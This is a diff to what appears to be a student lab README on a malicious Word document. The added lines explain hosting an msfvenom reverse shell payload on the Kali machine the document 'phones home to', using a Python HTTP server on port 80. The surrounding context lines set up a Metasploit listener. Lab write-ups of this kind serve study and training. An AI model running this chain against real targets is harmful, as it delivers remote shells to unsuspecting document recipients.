@@ -43,3 +43,9 @@ This was the main website I used to research the flags and how to use them(readi
 #### set LHOST our kali IP
 #### set Lport(same port as in the payload)  
 #### run
+
+# Hosting Payload
+On the machine the word doc phones home to (for our project the kali vm) The machine needs to host the msfvenom reverse shell payload
+### In the same directory as the msfvenom payload
+#### python3 -m http.server --bind 0.0.0.0 80
+
